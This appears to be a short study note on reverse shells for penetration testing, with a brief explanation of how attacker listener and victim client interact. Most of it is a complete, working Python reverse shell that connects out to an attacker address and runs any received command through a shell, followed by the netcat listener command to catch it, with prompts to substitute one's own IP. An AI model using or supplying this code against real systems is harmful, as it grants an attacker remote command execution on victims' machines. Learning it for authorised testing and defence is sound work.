Tags: [[Python]] [[Bash]] [[Cybersecurity]] [[Penetration Testing]] [[Reverse Shell]] 

A reverse shell is a type of connection where an attacker’s machine acts as a listener (server), and the compromised machine connects back to it (client). This is often used during penetration tests to bypass firewalls and NAT configurations, as outbound connections (from the target to the attacker) are less likely to be blocked

### **How a Reverse Shell Works**

1. **Attacker's Machine (Listener)**:
    
    - Sets up a server or listener (e.g., with `netcat` or a Python script) to wait for incoming connections.
2. **Victim's Machine (Client)**:
    
    - Runs a script that connects to the attacker’s machine and redirects input/output to a shell.
3. **Interaction**:
    
    - Once the connection is established, the attacker can execute commands on the victim's machine as if they were physically at the terminal.


## Basic Reverse Shell 
#ReverseShell

```python
import socket
import subprocess

# Define attacker's IP and port
attacker_ip = "192.168.1.100"  # Replace with your IP
attacker_port = 4444           # Replace with your desired port

# Create a socket connection
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((attacker_ip, attacker_port))

# Redirect commands to a shell
while True:
    # Receive command from attacker
    command = client_socket.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break

    # Execute the command and capture the output
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = str(e)

    # Send the output back to the attacker
    client_socket.send(output.encode("utf-8"))

# Close the connection
client_socket.close()

```

## Attackers Terminal 

Netcat would be used on the attackers computer to pick up the connection made from the python script.  #Netcat

```Bash
nc -lvnp 4444
```

